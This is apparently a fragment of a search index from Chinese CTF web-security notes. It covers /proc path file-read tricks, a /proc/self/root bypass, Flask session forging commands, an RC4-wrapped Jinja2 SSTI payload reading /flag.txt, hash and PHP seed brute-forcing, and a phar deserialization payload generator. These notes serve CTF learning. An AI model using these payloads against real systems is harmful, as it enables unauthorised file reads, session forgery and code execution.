<p>4./proc/net/dev</p> <p>5./proc/net/dev_mcast</p> <p>6./proc/net/igmp</p> <p>7./proc/net/netlink</p> <p>8./proc/net/netstat</p> <p>9./proc/net/raw</p> <p>10./proc/net/route</p> <p>11./proc/net/rt_cache</p> <p>12./proc/net/snmp</p> <p>13./proc/net/sockstat</p> <p>14./proc/net/tcp</p> <p>15./proc/net/udp</p> <p>16./proc/net/unix</p>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procself","title":"/proc/self/","text":""},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfenviron","title":"/proc/self/environ","text":"<p>\u5c1d\u8bd5\u8bbf\u95ee/proc/self/environ</p> <p>/proc/self\u2013\u5176\u8def\u5f84\u6307\u5411\u5f53\u524d\u8fdb\u7a0b</p> <p>/environ\u2013\u8bb0\u5f55\u5f53\u524d\u8fdb\u7a0b\u7684\u73af\u5883\u53d8\u91cf\u4fe1\u606f</p>"},{"location":"web/linux/web%E5%B8%B8%E7%94%A8linux%E8%B7%AF%E5%BE%84/#procselfroot","title":"/proc/self/root","text":"<p>/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u60f3\u5230\u8fd9\u91cc\uff0c\u7528\u4f2a\u534f\u8bae\u914d\u5408\u591a\u7ea7\u7b26\u53f7\u94fe\u63a5\u7684\u529e\u6cd5\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u6f0f\u6d1e\u5b58\u5728\u7684\u4f4d\u7f6e\u4f4d\u4e8ephp\u7684\u5185\u6838\uff08\u6211\u662f\u5f88\u60f3\u5c1d\u8bd5\u505a\u4e00\u6b21\u8c03\u8bd5\u7684\uff0c\u4f46\u662f\u6ca1\u627e\u7740\uff09</p> <pre><code>https://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&amp;mid=2649729209&amp;idx=1&amp;sn=78c1f6cf291e5cfca3088f02216ccffd&amp;chksm=888c98d6bffb11c014d8f98437879564702bd35b100f4337cbdf1f3cff827edfa4b9a8672637&amp;mpshare=1&amp;scene=23&amp;srcid=0812s60kjiOtHT66otXJWIHt&amp;sharer_sharetime=1597388716474&amp;seharer_shareid=33a823b10ae99f33a60db621d83241cb#rd\nPlain Text\n</code></pre> <p>\u6240\u4ee5\u6700\u540e\uff1a\"/proc/self/root\"*21+/flag\u5c31\u53ef\u4ee5\u5b8c\u6210\u7ed5\u8fc7\u3002</p> <p>[WMCTF2020]Make PHP Great Again</p> <p>\u4ee3\u7801\u5341\u5206\u7b80\u5355\uff0c\u9700\u8981\u7528\u5230\u7684\u662f\u5728\u7fa4\u91cc\u6240\u53d1\u7684\u90a3\u4e2a\u6f0f\u6d1e\uff0c/proc/self/root/\u662f\u6307\u5411/\u7684\u7b26\u53f7\u94fe\u63a5\u3002\uff08PHP\u5185\u6838\u6211\u770b\u8d77\u6765\u4e5f\u6bd4\u8f83\u5403\u529b\uff09\u5173\u952e\u70b9\u5e94\u8be5\u662f\uff1alstat\u51fd\u6570\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\u8bfb\u53d6path\u5b58\u5728\u4e86\u4e00\u4e2a\u6700\u5927\u503c\uff0c\u4f1a\u8ba4\u4e3a\u8def\u5f84\u4e0d\u5b58\u5728\uff0c\u7136\u540e\u6709\u53e6\u5916\u4e00\u4e2a\u51fd\u6570virtual_file_ex(..., CWD_FILEPATH)\uff0c\u5f53\u8def\u5f84\u4e0d\u5b58\u5728\u65f6\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5408\u6cd5\u7684\u8def\u5f84\uff0c\u56e0\u6b64\u7ed5\u8fc7lstat\u540e\u76f8\u5f53\u4e8e\u65f6\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u4e86\uff0c\u5f53\u7136\u9700\u8981php\u7684\u4f2a\u534f\u8bae\u8bfb\u6d41\u3002</p> <p>\"/proc/self/root\"*21+/flag</p>"},{"location":"web/linux/%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C/","title":"\u5185\u8054\u6267\u884c","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>linux\u5185\u8054\u6267\u884c\u4e00\u822c\u662f\u7275\u626f\u5230<code>`\uff08\u6ce8\u610f\u662f\u952e\u76d8\u5de6\u4e0a\u89d2\u7684</code>\u4e0d\u662f'\uff09\u548c$()</p> <p>\u8fd9\u4e24\u8005\u7684\u4f5c\u7528\u90fd\u662f\u4e00\u6837\u7684\uff0c\u5c06\u5305\u62ec\u8d77\u6765\u7684\u5185\u5bb9\u5148\u4e8e\u5916\u90e8\u8868\u8fbe\u5f0f\u89e3\u6790</p> <p>\u6bd4\u5982\u8bf4\uff1a</p> <p>cat $(ls) \u548c cat <code>ls</code></p> <p>\u5b9e\u9645\u6548\u679c\u662f\u5148ls \u7136\u540ecat \u201cls\u201d\u547d\u4ee4\u7684\u56de\u663e\uff0c\u5982\u679c\u5728\u8fd9\u4e2a\u6587\u4ef6\u5939\u4e0b\u6709\u4e2aflag.txt</p> <p>\u4f60\u5c31\u53ef\u4ee5\u5148\u8fdb\u5165\u8fd9\u4e2a\u6587\u4ef6\u5939,\u7136\u540ecat $(ls)\u6765\u8bfb\u53d6flag.txt</p> <p>\u4ed6\u4eec\u90fd\u4e0d\u80fd\u5d4c\u5957\u8c03\u7528\u3002</p> <p>\u6b63\u5e38\u4e00\u822c\u4f7f\u7528$()\uff0c\u56e0\u4e3a\u53cd\u5f15\u53f7\u6709\u65f6\u5019\u4f1a\u88ab\u8f6c\u79fb\uff0c\u4e0d\u8fc7\u5f53\u4e00\u822c\u51fa\u73b0\u5b57\u7b26\u6570\u9650\u5236\u7684\u8bdd\u5219\u4f1a\u4f7f\u7528\u5230</p> <p>``\u539f\u56e0\u662f\u5b83\u5c11\u4e86\u4e00\u4e2a\u5b57\u7b26\u3002</p> <p></p>"},{"location":"web/scripts/Flask-Session%E8%84%9A%E6%9C%AC%E8%A7%A3%E5%AF%86/","title":"Flask-Session\u811a\u672c\u89e3\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u7528\u4e8esession\u4f2a\u9020\u4e4b\u4e2d</p> <pre><code>\u56e0\u4e3a\u662f\u5df2\u7ecf\u4e0b\u8f7d\u4e86\u4e0b\u6765\uff0c\u4e0b\u9762\u653e\u4e0a\u4f7f\u7528\u65b9\u6cd5\u5c31\u597d\u4e86\npython3 session_cookie_manager.py decode -c 'ImFhYSI.YEdeLg.moazuNx4ewWV2f6l_7W9mCGDZqU' -s 'fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y'\u89e3\u5bc6\uff08session\uff09\n\n\npython3 session_cookie_manager.py encode -s '155.560932545' -t \"{'username': b'fuck'}\"\n(\u52a0\u5bc6session)\n</code></pre>"},{"location":"web/scripts/RC4%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/","title":"RC4\u52a0\u5bc6\u811a\u672c\uff1a","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>Import base64\nfrom urllib.parse import quote\ndef rc4_main(key = \"init_key\", message = \"init_message\"):\n    # print(\"RC4\u52a0\u5bc6\u4e3b\u51fd\u6570\")\n    s_box = rc4_init_sbox(key)\n    crypt = str(rc4_excrypt(message, s_box))\n    return  crypt\ndef rc4_init_sbox(key):\n    s_box = list(range(256))  # \u6211\u8fd9\u91cc\u6ca1\u7ba1\u79d8\u94a5\u5c0f\u4e8e256\u7684\u60c5\u51b5\uff0c\u5c0f\u4e8e256\u4e0d\u65ad\u91cd\u590d\u586b\u5145\u5373\u53ef\n    # print(\"\u539f\u6765\u7684 s \u76d2\uff1a%s\" % s_box)\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    # print(\"\u6df7\u4e71\u540e\u7684 s \u76d2\uff1a%s\"% s_box)\n    return s_box\ndef rc4_excrypt(plain, box):\n    # print(\"\u8c03\u7528\u52a0\u5bc6\u7a0b\u5e8f\u6210\u529f\u3002\")\n    res = []\n    i = j = 0\n    for s in plain:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(ord(s) ^ k))\n    # print(\"res\u7528\u4e8e\u52a0\u5bc6\u5b57\u7b26\u4e32\uff0c\u52a0\u5bc6\u540e\u662f\uff1a%res\" %res)\n    cipher = \"\".join(res)\n    print(\"\u52a0\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u662f\uff1a%s\" %quote(cipher))\n    #print(\"\u52a0\u5bc6\u540e\u7684\u8f93\u51fa(\u7ecf\u8fc7\u7f16\u7801):\")\n    #print(str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\n    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))\nrc4_main(\"HereIsTreasure\",\"{{''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/flag.txt').read()}}\")\n</code></pre>"},{"location":"web/scripts/md5%E6%88%AA%E6%96%AD%E7%88%86%E7%A0%B4/","title":"md5\u622a\u65ad\u7206\u7834","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>\u5c31\u662f\u8bf4\u7ed9\u51famd5\u540e\u524d\u591a\u5c11\u4f4d\u6570\u5b57\uff0c\u6c42\u539f\u6570\u5b57\n\u811a\u672c\u5982\u4e0b\nfrom multiprocessing.dummy import Pool as tp\nimport hashlib\n\nknownMd5 = 'af53d'      #\u5df2\u77e5\u7684md5\u660e\u6587\ndef md5(text):\n    return hashlib.md5(str(text).encode('utf-8')).hexdigest()\n\ndef findCode(code):\n    key = code.split(':')\n    start = int(key[0])\n    end = int(key[1])\n    for code in range(start, end):\n        if md5(code)[0:5] == knownMd5:\n            print(code)\n            break\nlist=[]\nfor i in range(3):    #\u8fd9\u91cc\u7684range(number)\u6307\u7206\u7834\u51fa\u591a\u5c11\u7ed3\u679c\u505c\u6b62\n    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))\npool = tp()    #\u4f7f\u7528\u591a\u7ebf\u7a0b\u52a0\u5feb\u7206\u7834\u901f\u5ea6\npool.map(findCode, list)\npool.close()\npool.join()\n</code></pre>"},{"location":"web/scripts/php_seed%E7%88%86%E7%A0%B4/","title":"php seed\u7206\u7834","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>\u662fphp\u4e2d\u7684\u4e24\u4e2a\u751f\u6210\u968f\u673a\u6570\u7684\u51fd\u6570\u5176\u5b9e\u662f\u4f2a\u968f\u673a\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\u53ef\u4ee5\u7206\u7834\u51fa\u6765\u5177\u4f53\u8be5\u600e\u4e48\u505a\u597d\u50cf\u4e5f\u6ca1\u4ec0\u4e48\u597d\u89e3\u91ca\u7684\uff0c\u6240\u4ee5\u5e72\u8106\u76f4\u63a5\u628a\u4ee3\u7801\u653e\u4e0a\u6765\u7528\u597d\u4e86\u3002\n\ns = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nkey = 'c1z5DuPZXT'\nm = ''\nfor i in key:\n    for j in range(len(s)):\n        if i == s[j]:\n            m += \"{} {} 0 {} \".format(j,j,len(s)-1)\nprint(m)\n\u5c06\u751f\u6210\u7684\u53c2\u6570\u653e\u5230\u4e00\u4e2a\u53eb\u505aphp_mt_seed4.0\u7684\u811a\u672c\u4e2d\u5c31\u597d\u4e86\n\u4f7f\u7528\u4e86mt_srand()\u51fd\u6570\u64ad\u79cd\uff0c\u5e76\u4f7f\u7528mt_rand()\u51fd\u6570\u751f\u6210\u968f\u673a\u6570\u3002\u8fd9\u91cc\u7684\u968f\u673a\u6570\u90fd\u662f\u4f2a\u968f\u673a\u6570\uff0c\u53ea\u8981\u5f97\u5230\u79cd\u5b50\uff0c\u5c31\u53ef\u4ee5\u751f\u6210\u76f8\u540c\u7684\u968f\u673a\u6570\u3002\n</code></pre> <p>\u4e0b\u9762\u7684\u4e1c\u897f\u53ef\u4ee5\u4e0b\u8f7dphp_mt_seed4.0\uff1a</p> <p>https://thoughts.aliyun.com/workspaces/5f98e6276b9dce0024026750/docs/607d8129e87e050001924835</p>"},{"location":"web/scripts/%E5%8F%96%E5%8F%8D%E5%AD%97%E7%AC%A6/","title":"\u53d6\u53cd\u5b57\u7b26","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <pre><code>&lt;?php\nheader('Content-Type: text/html; charset=utf-8');\n$str = 'string ';\nfor($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)\n{\n    $st = mb_substr($str, $i,1, 'utf-8');\n    $a = ~($st);\n    $b = $a[1];             #\u53d6\u6c49\u5b57\u7684\u7b2c\u4e00\u4f4d\n    if($b==$_GET['a'])      #$_GET['a']\u60f3\u8981\u5f97\u5230\u7684\u5b57\u7b26\n    {\n        echo $st;exit;\n    }\n    }\n?&gt;\n</code></pre>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p><code>phar</code>\u5728\u538b\u7f29\u6587\u4ef6\u5305\u65f6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684<code>meta-data</code>\uff0c\u914d\u5408<code>phar://</code>\u5c31\u80fd\u4e00\u4e9b\u51fd\u6570\u7b49\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4e8e\u662f\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u7cbe\u5fc3\u6784\u9020<code>phar</code>\u5305\u5728\u6ca1\u6709<code>unserialize()</code>\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u81ea\u52a8\u53cd\u5e8f\u5217\u5316\u653b\u51fb\uff0c\u4ece\u800c\u5f88\u5927\u7684\u62d3\u5c55\u4e86\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u7684\u653b\u51fb\u9762</p>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#phar_1","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\nPlain Text\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\nPlain Text\n</code></pre>"},{"location":"web/serialize/PHP/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_1","title":"phar://\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\nPlain Text\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> <p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; __HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\nPlain Text\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web/serialize/PHP/php_serialize/","title":"\u5b9a\u4e49\u53ca\u7406\u89e3","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>ps:\uff08\u524d\u4e24\u5c0f\u90e8\u5206\u6709\u57fa\u7840\u7684\u5c31\u4e0d\u7528\u6765\u770b\u4e86\u3002\uff09</p> <p>\u5e8f\u5217\u5316\u7684\u76ee\u7684\u662f\u65b9\u4fbf\u6570\u636e\u7684\u4f20\u8f93\u548c\u5b58\u50a8\u3002</p> <p>\u5728\u4f20\u9012\u53d8\u91cf\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6709\u53ef\u80fd\u9047\u5230\u53d8\u91cf\u503c\u8981\u8de8\u811a\u672c\u6587\u4ef6\u4f20\u9012\u7684\u8fc7\u7a0b\u3002\u5982\u679c\u4e00\u4e2a\u811a\u672c\u4e2d\u60f3\u8981\u7684\u8c03\u7528\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u7684\u53d8\u91cf\uff0c\u4f46\u662f\u4e4b\u524d\u4e00\u4e2a\u811a\u672c\u5df2\u7ecf\u6267\u884c\u5b8c\u6bd5\uff0c\u6240\u6709\u7684\u53d8\u91cf\u548c\u5185\u5bb9\u91ca\u653e\u6389\u4e86\uff0c\u90a3\u8be5\u5982\u4f55\u64cd\u4f5c\u5462\uff1fserialize\u548cunserialize\u5c31\u662f\u89e3\u51b3\u8fd9\u4e00\u95ee\uff0c\u9898\u7684\u5b58\u5728\uff0cserialize\u53ef\u4ee5\u5c06\u53d8\u91cf\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5728\u8f6c\u6362\u7684\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u4fdd\u5b58\u5f53\u524d\u53d8\u91cf\u7684\u503c\uff0c\u800cunserialize\u5219\u53ef\u4ee5\u5c06serialize\u751f\u6210\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u56de\u53d8\u91cf\u3002</p> <p>\u5728PHP\u5e94\u7528\u4e2d\uff0c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e00\u822c\u7528\u505a\u7f13\u5b58\uff0c\u6bd4\u5982session\u7f13\u5b58\uff0ccookie\u7b49\u3002</p> <p>PHP\u901a\u8fc7string serialize ( mixed $value )\u548cmixed unserialize ( string $str )\u4e24\u4e2a\u51fd\u6570\u5b9e\u73b0\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u3002\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u6267\u884c\u5b8c\u4e4b\u540e\u7684\u7ed3\u679c\u4e3aO:1:\"a\":1:{s:1:\"b\";i:1;}-</p> <p>\u89e3\u8bfb\u7684\u8bdd\u662f\u8fd9\u6837\u7684\uff1a<code>\u5bf9\u8c61\u7c7b\u578b:\u957f\u5ea6:\"\u7c7b\u540d\":\u7c7b\u4e2d\u53d8\u91cf\u7684\u4e2a\u6570:{\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";\u7c7b\u578b:\u957f\u5ea6:\"\u503c\";......}</code></p> <p>\u5982\u679c\u4f7f\u7528unserilize\u51fd\u6570\u7684\u8bdd\uff0c\u5c31\u4f1a\u5c06\u8fd9\u4e00\u4e32\u5b57\u7b26\u91cd\u65b0\u52a0\u8f7d\u56de\u7c7b\u3002</p> <p>$a=unserilize('O:1:\"a\":1:{s:1:\"b\";i:1;}')</p> <p>\u7136\u540e\u662f\u6570\u7ec4\u7684\u5e8f\u5217\u5316\uff1a</p> <pre><code>&lt;?php\n\n$data=['PHP','HTML','Java','Python'];\n\necho serialize($data);\necho\u51fa\u6765\u7684\u7ed3\u679c\u5982\u4e0b\uff1a\n\na:4:{i:0;s:3:\"PHP\";i:1;s:4:\"HTML\";i:2;s:4:\"Java\";i:3;s:6:\"Python\";}\n\n\u6211\u4eec\u518d\u7ed9\u8fd9\u6bb5\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e\u8fdb\u884c\u89e3\u91ca\uff0c\u65b9\u4fbf\u65b0\u624b\u670b\u53cb\u4eec\u4e86\u89e3\u5b66\u4e60\u3002\n\na\uff1a\u8868\u793a\u6574\u4f53\u7684\u6570\u636e\u7c7b\u578b\uff0c\u8fd9\u91cc\u662farray\uff1b\n\na:4\u4e2d\u76844\uff1a\u8868\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e2a\u6570\uff1b\n\ni\uff1a\u8868\u793aint\uff0c\u6574\u578b\uff1b\n\n0\uff1a\u8868\u793a\u6570\u7ec4\u5143\u7d20\u7684\u4e0b\u6807\uff1b\n\ns\uff1a\u8868\u793astring\uff0c\u5373\u6570\u7ec4\u503c\u7684\u7c7b\u578b\uff1b\n\ns:3\u4e2d3\uff1a\u8868\u793a\u6570\u7ec4\u503c\u7684\u957f\u5ea6\u3002\n</code></pre>"},{"location":"web/serialize/PHP/php_serialize/#magic","title":"MAGIC\u51fd\u6570","text":"<p>\u7c7b\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u4e00\u4e9b\u7279\u6b8a\u7684\u51fd\u6570\u53ebmagic\u51fd\u6570\uff0cmagic\u51fd\u6570\u547d\u540d\u662f\u4ee5\u7b26\u53f7\u201c_\u201d\u5f00\u5934\u7684\uff0c\u6bd4\u5982_construct,_destruct,_toString,_sleep,_wakeup\u7b49\u3002\u8fd9\u4e9b\u51fd\u6570\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u81ea\u52a8\u8c03\u7528\uff0c\u6bd4\u5982\uff1a_construct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u8c03\u7528\uff08constructor\uff09\uff1b_destruct\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u8c03\u7528\uff08destructor\uff09\uff1b_toString\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u65f6\u4f7f\u7528\u3002</p> <pre><code>&lt;?php\nclass test{    public $variable = 'BUZZ';    public $variable2 = 'OTHER';    public function printvariable()    {        echo $this-&gt;variable.'&lt;br /&gt;';    }    public function __construct()    {        echo '__construct'.'&lt;br /&gt;';    }    public function __destruct()    {        echo '__destruct'.'&lt;br /&gt;';    }    public function __wakeup()    {        echo '__wakeup'.'&lt;br /&gt;';    }    public function __sleep()    {        echo '__sleep'.'&lt;br /&gt;';        return array('variable','variable2');    }}\n//\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\uff0c\u56de\u8c03\u7528__construct$object = new test();//\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__sleep$serialized = serialize($object);//\u8f93\u51fa\u5e8f\u5217\u5316\u540e\u7684\u5b57\u7b26\u4e32print 'Serialized:'.$serialized.'&lt;br /&gt;';//\u91cd\u5efa\u5bf9\u8c61\uff0c\u4f1a\u8c03\u7528__wakeup$object2 = unserialize($serialized);//\u8c03\u7528printvariable,\u4f1a\u8f93\u51fa\u6570\u636e(BUZZ)$object2-&gt;printvariable();//\u811a\u672c\u7ed3\u675f\uff0c\u4f1a\u8c03\u7528__destruct?&gt;//test4.php\nPlain Text\n</code></pre> 